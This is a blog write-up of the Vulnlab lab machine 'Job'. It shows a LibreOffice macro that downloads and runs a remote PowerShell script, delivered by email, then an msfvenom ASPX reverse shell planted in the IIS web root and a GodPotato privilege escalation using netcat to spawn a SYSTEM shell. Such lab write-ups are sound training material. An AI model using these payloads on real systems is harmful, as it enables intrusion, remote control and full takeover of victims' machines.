<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Job - Vulnlab | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Job is a medium windows machine from Vulnlab created by xct. It involves getting Remote Code Execution (RCE) via Macros in LibreOffice Documents and exploiting SeImpersonatePrivilege for Privilege Esc">
<meta property="og:type" content="article">
<meta property="og:title" content="Job - Vulnlab">
<meta property="og:url" content="https://seriotonctf.github.io/2023/10/25/Job-Vulnlab/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="Job is a medium windows machine from Vulnlab created by xct. It involves getting Remote Code Execution (RCE) via Macros in LibreOffice Documents and exploiting SeImpersonatePrivilege for Privilege Esc">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Fdf7a8010-c06f-4ab7-b4ca-840c76b90893%2FUntitled.png?table=block&id=4eee05c7-64ed-409d-9fab-63f5a6e430ba&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2">
<meta property="article:published_time" content="2023-10-25T12:19:27.000Z">
<meta property="article:modified_time" content="2024-01-19T15:10:12.664Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="vulnlab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Fdf7a8010-c06f-4ab7-b4ca-840c76b90893%2FUntitled.png?table=block&id=4eee05c7-64ed-409d-9fab-63f5a6e430ba&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1020&userId=&cache=v2"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2023/10/25/Job-Vulnlab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Job - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-01-19 15:10:12'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Job - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2023-10-25T12:19:27.000Z" title="Created 2023-10-25 12:19:27">2023-10-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Job is a medium windows machine from Vulnlab created by xct. It involves getting Remote Code Execution (RCE) via Macros in LibreOffice Documents and exploiting <code>SeImpersonatePrivilege</code> for Privilege Escalation.</p>
<h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 13:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.69.83</span><br><span class="line">Host is up (0.083s latency).</span><br><span class="line">Not shown: 996 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">25/tcp   open  smtp          hMailServer smtpd</span><br><span class="line">| smtp-commands: JOB, SIZE 20480000, AUTH LOGIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Job.<span class="built_in">local</span></span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: JOB</span><br><span class="line">|   NetBIOS_Domain_Name: JOB</span><br><span class="line">|   NetBIOS_Computer_Name: JOB</span><br><span class="line">|   DNS_Domain_Name: job</span><br><span class="line">|   DNS_Computer_Name: job</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">|_  System_Time: 2023-10-23T17:52:39+00:00</span><br><span class="line">| ssl-cert: Subject: commonName=job</span><br><span class="line">| Not valid before: 2023-10-22T17:51:29</span><br><span class="line">|_Not valid after:  2024-04-22T17:51:29</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-10-23T17:53:18+00:00; -1s from scanner time.</span><br><span class="line">Service Info: Host: JOB; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<p>The Nmap scan tells us there are four ports open, SMTP on port 25, HTTP on port 80, SMB on port 445, and RDP on port 3389. It also tells us there is the <code>job.local</code> domain, so let’s add that to our hosts file.</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>If we go to the website on port 80, we can see a note saying </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please send your application to career@job.local! We recently switched to using open source products - please send your cv as a libre office document.</span><br></pre></td></tr></table></figure>

<h1 id="Shell-as-jack-black"><a href="#Shell-as-jack-black" class="headerlink" title="Shell as jack.black"></a>Shell as jack.black</h1><p>The note on the website is hinting towards crafting a malicious macro and use it to get RCE. To do this, I will follow this great writeup by 0xdf which has a section that explains how to make a malicious macro that will run a system command upon opening it <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2020/02/01/htb-re.html">https://0xdf.gitlab.io/2020/02/01/htb-re.html</a>.<br>The payload I am going to use is the following</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">REM  *****  BASIC  *****</span></span><br><span class="line"></span><br><span class="line">Sub Main</span><br><span class="line"></span><br><span class="line">	<span class="keyword">Shell</span>(<span class="string">&quot;cmd /c powershell &quot;</span><span class="string">&quot;iex(new-object net.webclient).downloadstring(&#x27;http://10.8.0.210/shell.ps1&#x27;)&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> Sub</span><br></pre></td></tr></table></figure>

<p>Now after saving our file as <code>&lt;filename&gt;.odt</code>, let’s start a python server and a netcat listener</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp 443</span><br></pre></td></tr></table></figure>

<p>At this point all we have to do is send the malicious file to the email that was written on the website <code>career@job.local</code>. I will use the <code>sawks</code> command to send the file</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  job swaks --to career@job.local --header <span class="string">&quot;CV&quot;</span> --body <span class="string">&quot;meow&quot;</span> --attach meow.odt --server job.local</span><br></pre></td></tr></table></figure>

<p>Wait for a few seconds and we get a shell as the user <code>jack.black</code> and we can read the user flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  job nc -nlvp 443</span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">connect to [10.8.0.210] from (UNKNOWN) [10.10.69.83] 54092</span><br><span class="line"></span><br><span class="line">PS C:\Program Files\LibreOffice\program&gt; <span class="built_in">whoami</span></span><br><span class="line">job\jack.black</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h1><h2 id="Shell-as-apppool-defaultapppool"><a href="#Shell-as-apppool-defaultapppool" class="headerlink" title="Shell as apppool\defaultapppool"></a>Shell as apppool\defaultapppool</h2><p>If we go to the web root directory <code>C:\inetpub\wwwroot</code>, we can see that we can write there, and since the web server is running as service account we can get a shell as that account and then use something like <code>SeImpersonatePrivilege</code> to escalate privileges.<br>Let’s prepare our <code>aspx</code> shell using <code>msfvenom</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.0.210 LPORT=443 -f aspx -o exploit.aspx</span><br></pre></td></tr></table></figure>

<p>Now we need to transfer it to the target machine and put it inside the <code>wwwroot</code> folder </p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="built_in">iwr</span> http://<span class="number">10.8</span>.<span class="number">0.210</span>/exploit.aspx <span class="literal">-outfile</span> exploit.aspx</span><br><span class="line"><span class="built_in">PS</span> C:\inetpub\wwwroot&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\inetpub\wwwroot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">11</span>/<span class="number">10</span>/<span class="number">2021</span>   <span class="number">8</span>:<span class="number">52</span> PM                aspnet_client</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">11</span>/<span class="number">9</span>/<span class="number">2021</span>   <span class="number">9</span>:<span class="number">24</span> PM                assets</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">11</span>/<span class="number">9</span>/<span class="number">2021</span>   <span class="number">9</span>:<span class="number">24</span> PM                css</span><br><span class="line">d<span class="literal">-----</span>         <span class="number">11</span>/<span class="number">9</span>/<span class="number">2021</span>   <span class="number">9</span>:<span class="number">24</span> PM                js</span><br><span class="line"><span class="literal">-a----</span>        <span class="number">10</span>/<span class="number">23</span>/<span class="number">2023</span>   <span class="number">6</span>:<span class="number">57</span> PM           <span class="number">3412</span> exploit.aspx</span><br></pre></td></tr></table></figure>

<p>At this point, all we have to do is to trigger it by visiting the following url</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.69.83/exploit.aspx</span><br></pre></td></tr></table></figure>

<p>We obtained a shell as the service user</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  www nc <span class="literal">-nlvp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.8</span><span class="type">.0.210</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.69.83</span>] <span class="number">54509</span></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.20348.350</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">iis apppool\defaultapppool</span><br></pre></td></tr></table></figure>

<h2 id="Shell-as-system"><a href="#Shell-as-system" class="headerlink" title="Shell as system"></a>Shell as system</h2><p>If we run <code>whomai /all</code>, we can see that we have the <code>SeImpersonatePrivilege</code> enabled</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SeImpersonatePrivilege Impersonate a client after authentication Enabled</span><br></pre></td></tr></table></figure>

<p>We can exploit this privilege using <code>GP</code> tool, available at <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/GodPotato/releases">https://github.com/BeichenDream/GodPotato/releases</a>.<br>First let’s grab <code>gp.exe</code> and <code>nc64.exe</code> from our box and start a netcat listener</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; <span class="built_in">iwr</span> http://<span class="number">10.8</span>.<span class="number">0.210</span>/nc64.exe <span class="literal">-outfile</span> nc64.exe</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; <span class="built_in">iwr</span> http://<span class="number">10.8</span>.<span class="number">0.210</span>/gp.exe <span class="literal">-outfile</span> gp.exe</span><br></pre></td></tr></table></figure>

<p>Finally, let’s run this command</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\temp&gt; .\gp.exe <span class="literal">-cmd</span> <span class="string">&quot;C:\temp\nc64.exe -e cmd.exe 10.8.0.210 443&quot;</span></span><br><span class="line">.\gp.exe <span class="literal">-cmd</span> <span class="string">&quot;C:\temp\nc64.exe -e cmd.exe 10.8.0.210 443&quot;</span></span><br><span class="line">[*] CombaseModule: <span class="number">0</span>x140714150002688</span><br><span class="line">[*] DispatchTable: <span class="number">0</span>x140714152593272</span><br><span class="line">[*] UseProtseqFunction: <span class="number">0</span>x140714151886704</span><br><span class="line">[*] UseProtseqFunctionParamCount: <span class="number">6</span></span><br><span class="line">[*] HookRPC</span><br><span class="line">[*] <span class="built_in">Start</span> PipeServer</span><br><span class="line">[*] CreateNamedPipe \\.\pipe\d6ce89f6<span class="literal">-a7b7-49fb-8d78-94633587bf42</span>\pipe\epmapper</span><br><span class="line">[*] Trigger RPCSS</span><br><span class="line">[*] DCOM obj GUID: <span class="number">00000000</span><span class="literal">-0000-0000-c000-000000000046</span></span><br><span class="line">[*] DCOM obj IPID: <span class="number">0000</span>ec02<span class="literal">-11a4-ffff-e4d8-ec29d0ee3ee7</span></span><br><span class="line">[*] DCOM obj OXID: <span class="number">0</span>xa8bd8a068d938289</span><br><span class="line">[*] DCOM obj OID: <span class="number">0</span>x1eb21eda1a714cb1</span><br><span class="line">[*] DCOM obj Flags: <span class="number">0</span>x281</span><br><span class="line">[*] DCOM obj PublicRefs: <span class="number">0</span>x0</span><br><span class="line">[*] Marshal Object bytes len: <span class="number">100</span></span><br><span class="line">[*] UnMarshal Object</span><br><span class="line">[*] Pipe Connected!</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">[*] CurrentsImpersonationLevel: Impersonation</span><br><span class="line">[*] <span class="built_in">Start</span> Search System Token</span><br><span class="line">[*] PID : <span class="number">976</span> Token:<span class="number">0</span>x732  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation</span><br><span class="line">[*] Find System Token : True</span><br><span class="line">[*] UnmarshalObject: <span class="number">0</span>x80070776</span><br><span class="line">[*] CurrentUser: NT AUTHORITY\SYSTEM</span><br><span class="line">[*] <span class="keyword">process</span> <span class="built_in">start</span> with pid <span class="number">4080</span></span><br></pre></td></tr></table></figure>

<p>And we have a shell as system and we can get the root flag.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  www nc <span class="literal">-nlvp</span> <span class="number">443</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">443</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.8</span><span class="type">.0.210</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.10</span><span class="type">.69.83</span>] <span class="number">54659</span></span><br><span class="line"></span><br><span class="line">Microsoft Windows [<span class="type">Version</span> <span class="number">10.0</span><span class="type">.20348.350</span>]</span><br><span class="line">(c) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\temp&gt;</span><br><span class="line">C:\temp&gt;whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\temp&gt;<span class="built_in">type</span> C:\users\administrator\desktop\root.txt</span><br><span class="line">VL&#123;REDCATED&#125;</span><br></pre></td></tr></table></figure>

<p>That concludes the box. I hope you learned something new :D</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io">serioton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://seriotonctf.github.io/2023/10/25/Job-Vulnlab/">https://seriotonctf.github.io/2023/10/25/Job-Vulnlab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnlab/">vulnlab</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/02/Slonik-Vulnlab/" title="Slonik - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F3c4cf065-3e0a-433a-a2d4-a1f5ee052a21%2Fspaces_I3I73FFqB6GvT8N5Mt1N_uploads_o4i6j9OnSS4TIFmGKqQT_slonik_slide.webp?table=block&amp;id=08f6badb-b393-4cdb-beaf-fa488c1e57d0&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1020&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Slonik - Vulnlab</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/19/Media-Vulnlab/" title="Media - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F723ecb50-3ce1-43a7-8202-b53f76aa2ccf%2Fmedia.png?table=block&amp;id=965e07b3-adbf-4f84-b843-97ecaafe658a&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1020&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Media - Vulnlab</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/12/14/Bamboo-Vulnlab/" title="Bamboo - Vulnlab"><img class="cover" src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F32f31a6a-94e8-4f0c-a634-b4d25ddb3468%2Fbamboo_slide.webp?table=block&id=4a0a5659-6394-4650-b233-d1910b3f33f8&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1030&userId=&cache=v2" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-12-14</div><div class="title">Bamboo - Vulnlab</div></div></a></div><div><a href="/2024/05/28/Escape-Vulnlab/" title="Escape - Vulnlab"><img class="cover" src="https://wiki.vulnlab.com/~gitbook/image?url=https%3A%2F%2F3528174365-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FI3I73FFqB6GvT8N5Mt1N%252Fuploads%252Ft12lXmil2VV0iVqncZnv%252Fescape_slide.png%3Falt%3Dmedia%26token%3Dce1f8941-c579-4d9a-bb57-ea6de1e5252b&width=768&dpr=1&quality=100&sign=642a654e4f3d5c89f5bd79724228f6521b285446f0055d8b5050aced207fd1f8" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-28</div><div class="title">Escape - Vulnlab</div></div></a></div><div><a href="/2024/01/20/Lock-Vulnlab/" title="Lock - Vulnlab"><img class="cover" src="https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FqlrTgqfYZ2LxYiFsS7F0%2Flock_slide.png?alt=media&token=4a34abe6-3e20-4725-9334-bd39e2db903a" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 